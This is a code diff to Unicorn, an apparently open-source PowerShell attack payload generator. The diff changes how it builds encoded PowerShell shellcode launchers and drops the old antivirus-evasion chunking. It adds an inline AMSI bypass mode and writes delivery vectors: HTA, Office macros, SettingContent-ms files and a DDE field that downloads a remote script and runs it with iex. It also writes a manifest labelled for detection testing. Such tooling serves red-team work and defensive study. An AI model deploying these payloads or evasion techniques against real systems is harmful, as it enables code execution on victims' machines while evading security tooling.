-            print("# AMSI BYPASS PAYLOAD BELOW")
-            print(bypass_amsi())
-            print("\n# ACTUAL UNICORN PAYLOAD BELOW")
-        print(powershell_code)
-        print("\n[*] Note that PRINT_DECODED inside unicorn.py was specified and printing the raw output for the PowerShell code. Turn this off to get the full unicorn code.")
-        sys.exit()
+        if AMSI_MODE != "off":
+            print("# AMSI bypass and shellcode loader run in the same child process")
+            print(build_amsi_bypass())
+            print()
+        print(loader)
+        print("\n[*] PRINT_DECODED is ON. Turn it off for normal output.")
+        sys.exit(0)
 
-    return powershell_code
+    return loader
 
 def gen_ps1_attack(ps1path):
     if os.path.isfile(ps1path):
@@ -1007,68 +1007,53 @@ def gen_ps1_attack(ps1path):
 
 
 def format_payload(powershell_code, attack_type, attack_modifier, option):
+    global LAST_SHELLCODE_BYTES, LAST_SHELLCODE_SHA256, LAST_LOADER_APIS
+
     gen_unicorn()
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
     print("\nHappy Magic Unicorns.")
 
-    ran1 = generate_random_string(2, 3)
-    ran2 = generate_random_string(2, 3)
-    ran3 = generate_random_string(2, 3)
+    if attack_type == "custom_ps1":
+        LAST_SHELLCODE_BYTES = None
+        LAST_SHELLCODE_SHA256 = None
+        LAST_LOADER_APIS = []
 
-    # format payload is for adding chunking to evade detection
-    avblah = base64.b64encode(powershell_code.encode('utf_16_le')) # kinder gentler dave variable name now
-    # here we mangle our encodedcommand by splitting it up in random chunks
-    avsux = random.randint(4000,5000)
-    avnotftw = [avblah[i: i + avsux] for i in range(0, len(avblah), avsux)]
-    haha_av = ""
-    counter = 0
-    for non_signature in avnotftw:
-        non_signature = (non_signature.rstrip())
-        if counter > 0: haha_av = haha_av + ("+")
-        if counter > 0: haha_av = haha_av + ("'") 
-        surprise_surprise = non_signature.decode("ascii") + ("'")
-        haha_av = haha_av + surprise_surprise #ThisShouldKeepMattHappy
-        haha_av = haha_av.replace("==", "'+'==")
-        counter = 1
-    full_attack = '''powershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
+    if OUTPUT_PROFILE == "cmd":
+        command_limit = CMD_LENGTH_LIMIT
+    elif OUTPUT_PROFILE == "powershell":
+        command_limit = POWERSHELL_LENGTH_LIMIT
+    elif attack_modifier in ("hta", "ms", "macro"):
+        command_limit = POWERSHELL_LENGTH_LIMIT
+    else:
+        command_limit = CMD_LENGTH_LIMIT
 
-    # if we want to use AMSI bypassing
-    if AMSI_BYPASS.lower() == "on": 
+    if AMSI_MODE == "inline":
+        child_script = build_amsi_bypass() + "\n" + powershell_code
+    else:
+        child_script = powershell_code
 
-        random_symbols = ['!', '@', '#', '%', '^', '&', '*', '(', ')', '-', '+', '=', '{', '}', '|', '.', ':', ';', '<', '>', '?', '/']
-        random_symbols = ['}']
-        mangle_shellcode = (random.choice(random_symbols))
-        # here we mangle the code a bit to get around AMSI detections
-        kernel32 = mangle_word("kernel32")
-        dll = mangle_word(".dll")
-        amsi = mangle_word("Amsi")
-        scan = mangle_word("Scan")
-        buffer = mangle_word("Buffer")
-        one = "$" + generate_random_string(5,10)
-        two = "$" + generate_random_string(5,10)
-        three = "$" + generate_random_string(5,10)
-        four = "$" + generate_random_string(5,10)
-        five = generate_random_string(5,10)
-        six = generate_random_string(5,10)
-        amsi_string = (bypass_amsi()).replace("$kernel32", kernel32).replace("$dll", dll).replace("$amsi", amsi).replace("$scan", scan).replace("$buffer", buffer).replace("$1111", one).replace("$2222", two).replace("$3333", three).replace("$4444", four)
-        amsi_string = (amsi_string).replace('%s = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3);' % (four), '%s = ("GOATxB8REPLACE, GOATxYAWN, GOATxGOATGOAT, GOATxGOAT7, GOATx8GOAT, GOATxC3").replace("YAWN", "57").replace("%s", "MOO").replace("B8REPLACE", "B8");%s = [Byte[]](%s).split(",");' % (four, mangle_shellcode, four, four)).replace("GOAT", mangle_shellcode).replace("MOO", "0").replace("YAWN", five).replace("B8REPLACE", six)
-        amsi_encoded = base64.b64encode(amsi_string.encode('utf_16_le')).decode('ascii')
-        # b8 horse
-        full_attack = '''# AMSI bypass code - run in same process as unicorn second stage\npowershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + amsi_encoded + "')" + '"' + "\n\n# actual unicorn payload\n" + full_attack
+    encoded = base64.b64encode(child_script.encode("utf_16_le")).decode("ascii")
+    if TARGET_ARCH == "x86":
+        child_path = r"C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
+    else:
+        child_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+    full_attack = 'powershell /w 1 /C "& \'{0}\' -w 1 -noexit -e {1}"'.format(child_path, encoded)
 
-    # powershell -w 1 -C "powershell ([char]45+[char]101+[char]99) YwBhAGwAYwA="  <-- Another nasty one that should evade. If you are reading the source, feel free to use and tweak
+    if len(full_attack) > command_limit:
+        print("[!] Generated command is {0} characters, above the {1} character limit.".format(len(full_attack), command_limit))
+        print("[!] Use --profile powershell for a larger delivery context, use --amsi off, or use hta/macro/staged delivery.")
+        sys.exit(1)
 
-    # for cobalt strike
+    manifest_command = full_attack
+
+    # Cobalt Strike.
     if attack_type == "cs":
-
-        # generate the hta attack vector with cobalt strike
         if attack_modifier == "hta":
             gen_hta_attack(full_attack)
             cobalt_strike()
             hta_help()
             print("[*] Exported the hta attack vector to hta_attack/. This folder contains everything you need. Enjoy!\n")
-
         elif attack_modifier == "ms":
             ms_voodoo_stuff()
             gen_hta_attack(full_attack)
@@ -1078,27 +1063,24 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
             print("[*] Exported SettingContent-ms and all HTA attack stuff to hta_attack as Standalone_NoASR.SettingContent-ms, Launcher.hta, and index.html.")
             print("[*] Edit the Standalone_NoASR.SettingContent-ms and replace the section 'REPLACECOOLSTUFFHERE' with something like mshta http://<ip_or_dns_to_server/Launcher.hta")
             print("[*] Example step: Start Apache and move contents of hta_attack/ to /var/www/html/, and edit .SettingContent-ms with mshta http://<ip_of_apache>.")
-
         elif attack_modifier == "macro":
             macro_attack = generate_macro(full_attack)
             write_file("powershell_attack.txt", macro_attack)
             cobalt_strike()
             macro_help()
             print("[*] Exported the Cobalt Strike Unicorn Attack for Macros out to powershell_attack.txt. Enjoy!\n")
-
         else:
             write_file("powershell_attack.txt", full_attack)
             cobalt_strike()
             print("[*] Exported the Cobalt Strike Unicorn Attack codebase out to powershell_attack.txt. Enjoy!\n")
 
-    # for custom shellcode
+    # Custom shellcode.
     if attack_type == "shellcode":
         if attack_modifier == "hta":
             gen_hta_attack(full_attack)
             custom_shellcode()
             hta_help()
             print("[*] Exported the hta attack vector to hta_attack/. This folder contains everything you need. Enjoy!\n")
-
         elif attack_modifier == "ms":
             ms_voodoo_stuff()
             gen_hta_attack(full_attack)
@@ -1108,80 +1090,51 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
             print("[*] Exported SettingContent-ms and all HTA attack stuff to hta_attack as Standalone_NoASR.SettingContent-ms, Launcher.hta, and index.html.")
             print("[*] Edit the Standalone_NoASR.SettingContent-ms and replace the section 'REPLACECOOLSTUFFHERE' with something like mshta http://<ip_or_dns_to_server/Launcher.hta")
             print("[*] Example step: Start Apache and move contents of hta_attack/ to /var/www/html/, and edit .SettingContent-ms with mshta http://<ip_of_apache>.")
-
         elif attack_modifier == "macro":
             macro_attack = generate_macro(full_attack)
             write_file("powershell_attack.txt", macro_attack)
             custom_shellcode()
             macro_help()
-
         else:
-            # add HTA option for shellcode
-            if "hta" in sys.argv:
-                gen_hta_attack(full_attack)
-                print("[*] Exported the custom shellcode to the hta generation under the hta_attacks folder. Enjoy!\n")
-            if "macro" in sys.argv:
-                macro_gen = generate_macro(full_attack)
-                write_file("powershell_attack.txt", macro_gen)
-                print("[*] Exported the custom shellcode to the macro generation and exported to powershell_attack.txt. Enjoy!\n")
-            else:
-                write_file("powershell_attack.txt", full_attack)
-                custom_shellcode()
-                print("[*] Exported the Custom Shellcode Attack codebase out to powershell_attack.txt. Enjoy!\n")
+            write_file("powershell_attack.txt", full_attack)
+            custom_shellcode()
+            print("[*] Exported the Custom Shellcode Attack codebase out to powershell_attack.txt. Enjoy!\n")
 
+    # Metasploit and download/exec.
     if attack_type == "msf" or attack_type == "download/exec":
         if attack_modifier == "macro":
             macro_attack = generate_macro(full_attack)
             write_file("powershell_attack.txt", macro_attack)
             macro_help()
-
         elif attack_modifier == "hta":
             gen_hta_attack(full_attack)
-            # move unicorn to hta attack if hta specified
-            shutil.move("unicorn.rc", "hta_attack/")
+            if os.path.isfile("unicorn.rc"):
+                shutil.move("unicorn.rc", "hta_attack/")
             hta_help()
-
         elif attack_modifier == "ms":
             ms_voodoo_stuff()
             gen_hta_attack(full_attack)
             custom_shellcode()
-            shutil.move("Standalone_NoASR.SettingContent-ms", "hta_attack/")
-            shutil.move("unicorn.rc", "hta_attack/")
+            if os.path.isfile("Standalone_NoASR.SettingContent-ms"):
+                shutil.move("Standalone_NoASR.SettingContent-ms", "hta_attack/")
+            if os.path.isfile("unicorn.rc"):
+                shutil.move("unicorn.rc", "hta_attack/")
             settings_ms()
             print("[*] Exported SettingContent-ms and all HTA attack stuff to hta_attack as Standalone_NoASR.SettingContent-ms, Launcher.hta, and index.html.")
             print("[*] Edit the Standalone_NoASR.SettingContent-ms and replace the section 'REPLACECOOLSTUFFHERE' with something like mshta http://<ip_or_dns_to_server/Launcher.hta")
             print("[*] Example step: Start Apache and move contents of hta_attack/ to /var/www/html/, and edit .SettingContent-ms with mshta http://<ip_of_apache>.")
-
-        else:  # write out powershell attacks
-
-            if len(full_attack) > 8191:
-                if AMSI_BYPASS.lower() == "on":
-                    print("[*] Note that AMSI_BYPASS is currently set to 'ON' which incorporates an AMSI Bypass technique that is large in nature.")
-                    print("[*] Windows command prompt has a character restriction of 8191 which if you are using cmd.exe as a payload delivery option, this will not work.")
-                    print("[*] Turn off AMSI_BYPASS=ON in the unicorn.py file located at the very top to turn this feature off which is ON by default.")
-                    print("[*] If you are calling PowerShell directly, this is not a concern.")
-                else:
-                    print("[!] WARNING. WARNING. Length of the payload is above command line limit length of 8191. Recommend trying to generate again or the line will be cut off.")
-                    print("[!] Total Payload Length Size: " + str(len(full_attack)))
-                    input("Press {return} to continue.")
-
-            # format for dde specific payload
+        else:
             if attack_modifier == "dde":
-                # download.ps1 is executed through IEX on the victim, so it needs the full
-                # powershell command line(s). Stripping the first 11 characters only worked
-                # before the AMSI bypass prepended comment/command lines - it now corrupts
-                # the first line of the script.
                 full_attack_download = full_attack
-                # incorporated technique here -> http://staaldraad.github.io/2017/10/23/msword-field-codes/
-                full_attack = ('''DDE "C:\\\\Programs\\\\Microsoft\\\\Office\\\\MSWord\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\{ QUOTE 87 105 110 100 111 119 115 80 111 119 101 114 83 104 101 108 108 }\\\\v1.0\\\\{ QUOTE 112 111 119 101 114 115 104 101 108 108 46 101 120 101 } -w 1 -nop { QUOTE 105 101 120 }(New-Object System.Net.WebClient).DownloadString('http://%s/download.ps1'); # " "Microsoft Document Security Add-On"''' % (ipaddr)) # quote = WindowsPowerShell, powershell.exe, and iex
-                with open ("download.ps1", "w") as fh: fh.write(full_attack_download)
-
+                manifest_command = full_attack_download
+                full_attack = '''DDE "C:\\Programs\\Microsoft\\Office\\MSWord\\..\\..\\..\\..\\windows\\system32\\{ QUOTE 87 105 110 100 111 119 115 80 111 119 101 114 83 104 101 108 108 }\\v1.0\\{ QUOTE 112 111 119 101 114 115 104 101 108 108 46 101 120 101 } -w 1 -nop { QUOTE 105 101 120 }(New-Object System.Net.WebClient).DownloadString('http://%s/download.ps1'); # " "Microsoft Document Security Add-On"''' % (ipaddr)
+                with open("download.ps1", "w") as fh:
+                    fh.write(full_attack_download)
             write_file("powershell_attack.txt", full_attack)
             if attack_modifier != "dde":
-                if AMSI_BYPASS.lower() == "on": amsi_help() # print the AMSI bypass language
-                ps_help() # present normal powershell attack instructions
-
-            # if we are using dde attack, present that method
+                if AMSI_MODE != "off":
+                    amsi_help()
+                ps_help()
             if attack_modifier == "dde":
                 dde_help()
 
@@ -1191,39 +1144,51 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
             write_file("powershell_attack.txt", macro_attack)
         else:
             write_file("powershell_attack.txt", full_attack)
-
         custom_ps1_help()
 
-    else:
-        if attack_type != "cs":
-            if attack_type != "shellcode":
-                if attack_modifier != "hta":
-                    if attack_modifier != "macro":
-                       write_file("powershell_attack.txt", full_attack)
-                       ps_help()
+    manifest = {
+        "variant": {
+            "seed": RANDOM_SEED,
+            "architecture": TARGET_ARCH,
+            "amsi_mode": AMSI_MODE,
+            "profile": OUTPUT_PROFILE,
+        },
+        "delivery": {
+            "attack_type": attack_type,
+            "attack_modifier": attack_modifier,
+            "command_length": len(full_attack),
+            "command_limit": command_limit,
+            "within_limit": len(full_attack) <= command_limit,
+        },
+        "shellcode": {
+            "bytes": len(LAST_SHELLCODE_BYTES) if LAST_SHELLCODE_BYTES is not None else None,
+            "sha256": LAST_SHELLCODE_SHA256,
+        },
+        "command": {
+            "powershell_path": child_path,
+            "encoded_child_sha256": hashlib.sha256(manifest_command.encode("utf-8")).hexdigest(),
+            "raw_child_sha256": hashlib.sha256(child_script.encode("utf-8")).hexdigest(),
+        },
+        "apis": LAST_LOADER_APIS or [],
+    }
+    write_file("unicorn_manifest.json", json.dumps(manifest, indent=2))
 
-    # Print completion messages
     if attack_type == "msf" and attack_modifier == "hta":
         print("[*] Exported index.html, Launcher.hta, and unicorn.rc under hta_attack/.")
         print("[*] Run msfconsole -r unicorn.rc to launch listener and move index and launcher to web server.\n")
-
-    elif attack_type == "msf" or attack_type =="download/exec":
+    elif attack_type == "msf" or attack_type == "download/exec":
         print("[*] Exported powershell output code to powershell_attack.txt.")
         if attack_type != "download/exec":
             print("[*] Exported Metasploit RC file as unicorn.rc. Run msfconsole -r unicorn.rc to execute and create listener.")
-
         if attack_type == "download/exec":
             print("[*] This attack does not rely on Metasploit, its custom shellcode. Whatever you execute, if its a payload that is a reverse connection, make sure you have a listener setup.")
-
         if attack_modifier == "dde":
             print("[*] Exported download.ps1 which is what you use for code execution. (READ INSTRUCTIONS)")
         print("\n")
-
     elif attack_type == "custom_ps1":
         print("[*] Exported powershell output code to powershell_attack.txt")
+    print("[*] Exported unicorn_manifest.json for reproducible detection testing.")
 
-
-# This is the SettingContent-ms filetype based on research here: https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39
 def ms_voodoo_stuff():
     # read file content in
     ms_input = open("templates/Standalone_NoASR.SettingContent-ms", "r").read()
@@ -1291,9 +1256,10 @@ try:
             gen_usage()
             sys.exit()
 
-        # if using a 64 bit payload then downgrade to 32 bit. The way unicorn works is by doing whats called an x86 downgrade attack so there is$
-        if ("windows/x64/meterpreter") in sys.argv[1]:
-            print("[!] WARNING: x64 meterpreter payload selected which is not compatible. Unicorn handles shellcode creation on both 32 and 64 by using an x86 downgrade attack regardless of 32 and 64 bit platforms. No interaction needed, downgrading to 32-bit payload.")
+        # Keep the x86 downgrade for the default profile. Preserve x64
+        # meterpreter when the user explicitly selects --arch x64.
+        if ("windows/x64/meterpreter") in sys.argv[1] and TARGET_ARCH == "x86":
+            print("[!] WARNING: x64 meterpreter payload selected with the default x86 profile. Unicorn is downgrading the payload to x86. Use --arch x64 to keep x64 shellcode.")
             sys.argv[1] = sys.argv[1].replace("windows/x64/", "windows/")
 
         # settings option for SettingContent-ms filetype attack vector
